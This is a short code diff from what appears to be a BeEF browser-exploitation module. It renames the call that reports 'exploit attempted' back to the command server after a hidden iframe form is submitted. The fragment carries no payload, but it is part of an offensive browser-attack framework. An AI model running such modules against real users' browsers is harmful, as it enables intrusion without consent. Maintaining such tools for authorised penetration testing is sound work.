@@ -88,5 +88,5 @@ beef.execute(function() {
   iframe.contentWindow.document.body.appendChild(form);
   form.submit();
 
-  beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
+  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
 });
